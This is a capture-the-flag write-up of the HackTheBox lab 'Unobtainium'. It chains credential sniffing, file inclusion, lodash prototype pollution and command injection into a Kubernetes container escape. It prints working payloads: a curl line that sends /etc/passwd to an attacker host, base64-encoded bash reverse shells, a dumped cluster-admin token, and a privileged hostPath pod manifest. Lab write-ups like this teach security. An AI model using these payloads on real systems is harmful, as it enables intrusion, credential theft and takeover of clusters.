---
title: "Unobtainium - HackTheBox (HTB) - Hard Box Writeup"
pubDate: 2022-12-14
slug: "unobtanium-hackthebox-htb-hard-box"
featured: false
draft: false
commentsEnabled: false
categories:
  - Cybersecurity
  - HackTheBox
tags:
  - HTB
  - Hack The Box
  - Hard Box
  - Linux
  - Cybersecurity
  - Enumeration
  - Exploitation
  - Command Injection
  - Local File Inclusion
  - Prototype Pollution
  - Kubernetes
  - Container Breakout
ogImage: "./images/Untitled.png"
description: "A no-frills walkthrough of Unobtainium, a hard level challenge box on HTB (HackTheBox) - a platform for practicing ethical hacking skills."
---

## Unobtainium

![Challenge style](./images/Untitled_1.png "Challenge style")

![Difficulty](./images/Untitled_2.png "Difficulty level - hard")

## Nmap Scan

As always we start with our port scan.

```bash
└─$ sudo nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan 10.129.84.247
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 12:52 BST
Nmap scan report for 10.129.84.247
Host is up (0.020s latency).
Not shown: 65527 closed ports
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)
|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)
|_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)
80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium
2379/tcp  open  ssl/etcd-client?
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2021-01-17T07:10:30
|_Not valid after:  2022-01-17T07:10:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  h2
| tls-nextprotoneg:
|_  h2
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2021-01-17T07:10:30
|_Not valid after:  2022-01-17T07:10:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  h2
| tls-nextprotoneg:
|_  h2
8443/tcp  open  ssl/https-alt
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 21 Apr 2021 11:53:23 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 21 Apr 2021 11:53:23 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions:
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 21 Apr 2021 11:53:23 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.129.84.247, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2021-04-20T11:42:31
|_Not valid after:  2022-04-21T11:42:31
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|_  http/1.1
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium@1610865428
| Subject Alternative Name: DNS:unobtainium
| Not valid before: 2021-01-17T05:37:08
|_Not valid after:  2022-01-17T05:37:08
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
31337/tcp open  http             Node.js Express framework
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8)
```

A lot of ports open, lets summarise.

| Port                | Description      |
| ------------------- | ---------------- |
| 22                  | :OpenSSH         |
| 80                  | HTTP Server      |
| 2379                | etcd-client      |
| 2380                | etcd-client      |
| 8443                | ?                |
| 10249, 10250, 10256 | ?                |
| 32337               | Unobtainium chat |

## Port 80

Opening the machines IP in browser we can see a simple website. It describes a chat application and provides us with a few downloads and a txt files containing checksums. A quick scan of the website html source shows nothing interesting.

I'm on Kali so I downloaded the .deb version for analysis.

![Screenshot of site](./images/Untitled_3.png "Screenshot of site")

[http://10.129.84.247/downloads/checksums.txt](http://10.129.84.247/downloads/checksums.txt)

```bash
c9fe8a2bbc66290405803c3d4a37cf28  unobtainium_1.0.0_amd64.deb
d61b48f165dab41af14c49232975f6a1  unobtainium_1.0.0_amd64.snap
9e35724c18f9f98192f0412c89ba54c7  unobtainium-1.0.0.x86_64.rpm
```

## Inspecting the Application

After downloading the package I unzipped it like so:

![./images/Untitled_4.png](./images/Untitled_4.png)

We can now extract the files from the .deb package using `dpkg-deb`.

```bash
┌──(dan㉿kali)-[~/HacktheBox/unobtainium]
└─$ mkdir extracted-deb

┌──(dan㉿kali)-[~/HacktheBox/unobtainium]
└─$ dpkg-deb -xv unobtainium_1.0.0_amd64.deb ./extracted-deb
./
./usr/
./usr/share/
./usr/share/icons/
./usr/share/icons/hicolor/
./usr/share/icons/hicolor/32x32/
./usr/share/icons/hicolor/32x32/apps/
./usr/share/icons/hicolor/32x32/apps/unobtainium.png
./usr/share/icons/hicolor/48x48/
./usr/share/icons/hicolor/48x48/apps/
./usr/share/icons/hicolor/48x48/apps/unobtainium.png
./usr/share/icons/hicolor/256x256/
./usr/share/icons/hicolor/256x256/apps/
./usr/share/icons/hicolor/256x256/apps/unobtainium.png
./usr/share/icons/hicolor/128x128/
./usr/share/icons/hicolor/128x128/apps/
./usr/share/icons/hicolor/128x128/apps/unobtainium.png
./usr/share/icons/hicolor/64x64/
./usr/share/icons/hicolor/64x64/apps/
./usr/share/icons/hicolor/64x64/apps/unobtainium.png
./usr/share/icons/hicolor/16x16/
./usr/share/icons/hicolor/16x16/apps/
./usr/share/icons/hicolor/16x16/apps/unobtainium.png
./usr/share/applications/
./usr/share/applications/unobtainium.desktop
./usr/share/doc/
./usr/share/doc/unobtainium/
./usr/share/doc/unobtainium/changelog.gz
./opt/
./opt/unobtainium/
./opt/unobtainium/libvulkan.so
./opt/unobtainium/chrome_100_percent.pak
./opt/unobtainium/unobtainium
./opt/unobtainium/libffmpeg.so
./opt/unobtainium/snapshot_blob.bin
./opt/unobtainium/v8_context_snapshot.bin
./opt/unobtainium/vk_swiftshader_icd.json
./opt/unobtainium/LICENSE.electron.txt
./opt/unobtainium/locales/
./opt/unobtainium/locales/th.pak
./opt/unobtainium/locales/da.pak
./opt/unobtainium/locales/gu.pak
./opt/unobtainium/locales/ro.pak
./opt/unobtainium/locales/it.pak
./opt/unobtainium/locales/fil.pak
./opt/unobtainium/locales/fi.pak
./opt/unobtainium/locales/ml.pak
./opt/unobtainium/locales/hu.pak
./opt/unobtainium/locales/id.pak
./opt/unobtainium/locales/zh-CN.pak
./opt/unobtainium/locales/bg.pak
./opt/unobtainium/locales/hi.pak
./opt/unobtainium/locales/sk.pak
./opt/unobtainium/locales/fr.pak
./opt/unobtainium/locales/mr.pak
./opt/unobtainium/locales/et.pak
./opt/unobtainium/locales/kn.pak
./opt/unobtainium/locales/ar.pak
./opt/unobtainium/locales/he.pak
./opt/unobtainium/locales/sv.pak
./opt/unobtainium/locales/en-GB.pak
./opt/unobtainium/locales/cs.pak
./opt/unobtainium/locales/te.pak
./opt/unobtainium/locales/el.pak
./opt/unobtainium/locales/pt-PT.pak
./opt/unobtainium/locales/hr.pak
./opt/unobtainium/locales/ru.pak
./opt/unobtainium/locales/ca.pak
./opt/unobtainium/locales/es.pak
./opt/unobtainium/locales/sw.pak
./opt/unobtainium/locales/uk.pak
./opt/unobtainium/locales/fa.pak
./opt/unobtainium/locales/ko.pak
./opt/unobtainium/locales/es-419.pak
./opt/unobtainium/locales/vi.pak
./opt/unobtainium/locales/lv.pak
./opt/unobtainium/locales/zh-TW.pak
./opt/unobtainium/locales/pl.pak
./opt/unobtainium/locales/pt-BR.pak
./opt/unobtainium/locales/sl.pak
./opt/unobtainium/locales/nl.pak
./opt/unobtainium/locales/ja.pak
./opt/unobtainium/locales/sr.pak
./opt/unobtainium/locales/am.pak
./opt/unobtainium/locales/bn.pak
./opt/unobtainium/locales/ms.pak
./opt/unobtainium/locales/nb.pak
./opt/unobtainium/locales/tr.pak
./opt/unobtainium/locales/de.pak
./opt/unobtainium/locales/ta.pak
./opt/unobtainium/locales/en-US.pak
./opt/unobtainium/locales/lt.pak
./opt/unobtainium/chrome-sandbox
./opt/unobtainium/libEGL.so
./opt/unobtainium/resources/
./opt/unobtainium/resources/app.asar
./opt/unobtainium/chrome_200_percent.pak
./opt/unobtainium/libGLESv2.so
./opt/unobtainium/swiftshader/
./opt/unobtainium/swiftshader/libEGL.so
./opt/unobtainium/swiftshader/libGLESv2.so
./opt/unobtainium/resources.pak
./opt/unobtainium/icudtl.dat
./opt/unobtainium/LICENSES.chromium.html
./opt/unobtainium/libvk_swiftshader.so

┌──(dan㉿kali)-[~/HacktheBox/unobtainium]
└─$ cd extracted-deb

┌──(dan㉿kali)-[~/HacktheBox/unobtainium/extracted-deb]
└─$ cd opt

┌──(dan㉿kali)-[~/HacktheBox/unobtainium/extracted-deb/opt]
└─$ ls
unobtainium
```

We can find an executable for the application in: `extracted-deb/opt/unobtainium`

![./images/Untitled_5.png](./images/Untitled_5.png)

Let's try running it and see what happens.

```bash
┌──(dan㉿kali)-[~/…/unobtainium/extracted-deb/opt/unobtainium]
└─$ ./unobtainium
(node:345446) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
```

Looks like it launches an electron app, but we get an error: `Unable to reach unobtainium.htb`

![./images/Untitled_6.png](./images/Untitled_6.png)

We need to update our `/etc/hosts` file.

![./images/Untitled_7.png](./images/Untitled_7.png)

After playing around and testing things a bit it seems like the only functionality implemented is the `UI`, `message log`, and `post messages` function. There is a Todo screen with the following:

![./images/Untitled_8.png](./images/Untitled_8.png)

Message log displays messages in `JSON`

```bash
[{"icon":"__","text":"test","id":1,"timestamp":1619018632376,"userName":"felamos"},{"icon":"__","text":"todo","id":2,"timestamp":1619018759017,"userName":"felamos"}]
```

We enumerate a possible username from this: `felamos`

## Sniffing Credentials

Let's try sniffing the requests with `Wireshark` for anything interesting.

![./images/Untitled_9.png](./images/Untitled_9.png)

Perfect. Looks like we captured a `POST` request that sends credentials in plaintext. Let's note what we have gathered:

**name**: felamos
**password**: Winter2021
**host**: unobtainium.htb:31337
**URI**: [http://unobtainium.htb:31337/todo](http://unobtainium.htb:31337/todo)
**filename**: todo.txt

We've gained credentials, and an endpoint we can try to exploit. As we can see in the request the application is sending a POST request which passes a filename as an argument. If the backend is reading files then we can test it for LFI (local file inclusion) vulnerabilities.

## Exploiting Todo

Adding the request to `Burpsuite repeater` we can experiment and try to discover more.

```bash
POST /todo HTTP/1.1
Host: unobtainium.htb:31337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
Accept: */*
Content-Type: application/json
Content-Length: 73
Connection: close

{
 "auth":{
  "name":"felamos",
  "password":"Winter2021"
 },
 "filename":"todo.txt"
}
```

We can successfully send a request for the `todo.txt`. Let's try for some other things. I tested for `/etc/passwd`, `user.txt`, `todox.txt`, and `blank`.

It seems the server doesn't give a response unless the file exists or no parameter is supplied. With a blank filename we get the following:

```bash
Error: ENOENT: no such file or directory, open<br> &nbsp; &nbsp;at Object.openSync (fs.js:476:3)<br> &nbsp; &nbsp;at Object.readFileSync (fs.js:377:35)<br> &nbsp; &nbsp;at /usr/src/app/index.js:86:41<br> &nbsp; &nbsp;at Array.forEach (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at /usr/src/app/index.js:84:36<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /usr/src/app/node_modules/express/lib/router/index.js:281:22
```

We get a little information on where the app lives `/usr/src/app/index.js` alongside knowing it is `JavaScript` backend. We can try grabbing the `package.json` and looking for what dependences the server is using - this may lead to something we can exploit!

Success!

```bash
{
  "name": "Unobtainium-Server",
  "version": "1.0.0",
  "description": "API Service for Electron client",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "author": "felamos",
  "license": "ISC",
  "dependencies": {
    "body-parser": "1.18.3",
    "express": "4.16.4",
    "lodash": "4.17.4",
    "google-cloudstorage-commands": "0.0.1"
  },
  "devDependencies": {}
}
```

Let's look for some CVE's

**[google-cloudstorage-commands](https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431)**

Affected versions of this package are vulnerable to Command Injection.

```bash
var root = require("google-cloudstorage-commands");
root.upload("./","& touch JHU", true);
```

lodash has a number of possible vulnerabilities so lets see if we can get a bit more out of our LFI.

```bash
POST /todo HTTP/1.1
Host: unobtainium.htb:31337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
Accept: */*
Content-Type: application/json
Content-Length: 92
Connection: close

{
 "auth":{
  "name":"felamos",
  "password":"Winter2021"
 },
 "filename":"index.js"
}
```

```jsx
app.put("/", (req, res) => {
  const user = findUser(req.body.auth || {})

  if (!user) {
    res.status(403).send({ ok: false, error: "Access denied" })
    return
  }

  const message = {
    icon: "__"
  }

  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name
  })

  messages.push(message)
  res.send({ ok: true })
})
```

```jsx
app.post("/upload", (req, res) => {
  const user = findUser(req.body.auth || {})
  if (!user || !user.canUpload) {
    res.status(403).send({ ok: false, error: "Access denied" })
    return
  }

  filename = req.body.filename
  root.upload("./", filename, true)
  res.send({ ok: true, Uploaded_File: filename })
})
```

Grabbing the `index.js` gives us something to work with. We can see there is an `/upload` endpoint and also a `PUT` request that uses lodash's `merge()`. Looks like there's a CVE for that: [https://snyk.io/vuln/SNYK-JS-LODASH-73638](https://snyk.io/vuln/SNYK-JS-LODASH-73638)

Together we have a prototype pollution and a command injection vulnerability. We could try using the lodash vuln to enable uploads and then the google-cloudstorage-commands vuln to upload a reverse shell? Let's give it a try,

[https://github.com/Kirill89/prototype-pollution-explained](https://github.com/Kirill89/prototype-pollution-explained)

Kirill89 demonstrates a PoC for this exact lodash vulnerability - we just modify the payload to:

```json
"__proto__":{
 "canUpload":true,
 "canDelete":true,
}
```

```bash
PUT / HTTP/1.1
Host: unobtainium.htb:31337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
Accept: */*
Content-Type: application/json
Content-Length: 157
Connection: close

{
 "auth":{
  "name":"felamos",
  "password":"Winter2021"
 },
"message":{
 "text": "boop",
  "__proto__":{
   "canUpload":true,
   "canDelete":true
  }
 }
}
```

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 11
ETag: W/"b-Ai2R8hgEarLmHKwesT1qcY913ys"
Date: Wed, 21 Apr 2021 19:47:58 GMT
Connection: close

{"ok":true}
```

Next lets try exploiting the RCE, looking through the index.js source we can see it takes a filename parameter and returns the same filename if successful. This means we need to craft our payload to send us the confirmation. We'll setup a `HTTP server` with `updog`.

![./images/Untitled_10.png](./images/Untitled_10.png)

Then we run our attack by `POST` to the `/upload` endpoint.

```bash
POST /upload HTTP/1.1
Host: unobtainium.htb:31337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
Accept: */*
Content-Type: application/json
Content-Length: 140
Connection: close

{
 "auth":{
  "name":"felamos",
  "password":"Winter2021"
 },
 "filename":"& curl http://10.10.14.90:1234/$(cat /etc/passwd|base64)"
}
```

![Success](./images/Untitled_11.png)

Success

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/
```

Looks like it works. Now lets setup a `pwncat` listener and send our reverse shell command

```bash
┌──(dan㉿kali)-[~/HacktheBox/unobtainium]
└─$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.90/4444 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45MC80NDQ0IDA+JjEnCg==
```

```bash
echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45MC80NDQ0IDA+JjEnCg== | base64 -d | bash 2>/dev/null
```

![listen for connection](./images/Untitled_12.png)

listen for connection

![send exploit](./images/Untitled_13.png)

send exploit

![success!](./images/Untitled_14.png)

success!

We can the get our user flag!

![./images/Untitled_15.png](./images/Untitled_15.png)

The fact we got our user flag as root is an obvious indicator that we are in a container. Now we try some enumeration with `LinEnum`.

![./images/Untitled_16.png](./images/Untitled_16.png)

![./images/Untitled_17.png](./images/Untitled_17.png)

![./images/Untitled_18.png](./images/Untitled_18.png)

![./images/Untitled_19.png](./images/Untitled_19.png)

![./images/Untitled_20.png](./images/Untitled_20.png)

Looks like we are in `kubernetes` and there's an interesting `cron job`:

```bash
find / -name kubectl -exec rm {} \;
```

Looks like this `cron` is looking for any instances of `kubectl` - this is the command line tool used to control K8's clusters. Assuming the reason for this `cron` is to prevent us from using this tool it makes sense that we should try to circumvent that.
[https://kubernetes.io/docs/reference/kubectl/overview/](https://kubernetes.io/docs/reference/kubectl/overview/)

We could do this by uploading a `kubectl` binary with a different name.

Download kubectl to our local machine:

`curl -LO "[https://dl.k8s.io/release/$](https://dl.k8s.io/release/$)(curl -L -s [https://dl.k8s.io/release/stable.txt](https://dl.k8s.io/release/stable.txt))/bin/linux/amd64/kubectl"`

![./images/Untitled_21.png](./images/Untitled_21.png)

Then download it from our HTTP server

![./images/Untitled_22.png](./images/Untitled_22.png)

Now we try enumerate some:

![./images/Untitled_23.png](./images/Untitled_23.png)

![./images/Untitled_24.png](./images/Untitled_24.png)

```bash
root@webapp-deployment-5d764566f4-lrpt9:~# ./kc describe pods devnode-deployment-cd86fb5c-6ms8d -n dev
<cribe pods devnode-deployment-cd86fb5c-6ms8d -n dev
Name:         devnode-deployment-cd86fb5c-6ms8d
Namespace:    dev
Priority:     0
Node:         unobtainium/10.129.84.247
Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  <none>
Status:       Running
IP:           172.17.0.9
IPs:
  IP:           172.17.0.9
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:
  devnode:
    Container ID:   docker://02cef9140779577493c9f48fcf1fde47c4f4085cdab7607ea52ec4ac898cd278
    ogImage:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Wed, 21 Apr 2021 11:43:07 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Wed, 24 Mar 2021 10:43:09 +0000
      Finished:     Wed, 24 Mar 2021 10:48:20 +0000
    Ready:          True
    Restart Count:  27
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True
  Ready             True
  ContainersReady   True
  PodScheduled      True
Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          <none>
```

After checking things it seems like we are in a different environment, we are in production running our commands against the dev environment. So we can use the same attack we did before to gain a foothold. I setup another pwncat listener on a differ port then ran the previous exploit commands from our current shell against the local IP using curl:

```bash
curl 172.17.0.9:3000/ -XPUT -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":"x","__proto__":{"canUpload":true}}}' -H "Content-Type: application/json"
```

```bash
curl 172.17.0.9:3000/upload -XPOST -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45MC81NTU1IDA+JjEnCg== | base64 -d | bash 2>/dev/null"}' -H "Content-Type: application/json"
```

![./images/Untitled_25.png](./images/Untitled_25.png)

Success!

We can repeat the process of getting `kubectl`.

![./images/Untitled_26.png](./images/Untitled_26.png)

Looks like we can now dump the secrets.

![./images/Untitled_27.png](./images/Untitled_27.png)

Notice the `c-admin-token-tfmp2` this is the cluster admin secret!

```bash
root@devnode-deployment-cd86fb5c-6ms8d:~# ./kc describe secrets/c-admin-token-tfmp2 -n kube-system
<describe secrets/c-admin-token-tfmp2 -n kube-system
Name:         c-admin-token-tfmp2
Namespace:    kube-system
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: c-admin
              kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0

Type:  kubernetes.io/service-account-token

Data
====
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
ca.crt:     1066 bytes
namespace:  11 bytes
```

Check if we can create pods.

![./images/Untitled_28.png](./images/Untitled_28.png)

Now that we can create pods lets do some research on how to abuse this, if we can create a malicious pod perhaps that's our path to real root...

Quick Google brings up badPods: [https://github.com/BishopFox/badPods](https://github.com/BishopFox/badPods)

Let's go with option 1 - Everything Allowed due to us having the cluster admin secret - [https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed](https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed)

Download the `yaml` to our local machine and edit it, then following the badpods method we create our pod then execute on it to get our root flag!

![./images/Untitled_29.png](./images/Untitled_29.png)

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
    - name: everything-allowed-pod
      ogImage: http://localhost:5000/dev-alpine
      securityContext:
        privileged: true
      volumeMounts:
        - mountPath: /host
          name: noderoot
      command: ["/bin/sh", "-c", "--"]
      args: ["while true; do sleep 30; done;"]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
    - name: noderoot
      hostPath:
        path: /
```

```bash
./kc --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow apply -f everything-allowed-exec-pod.yaml
```

```bash
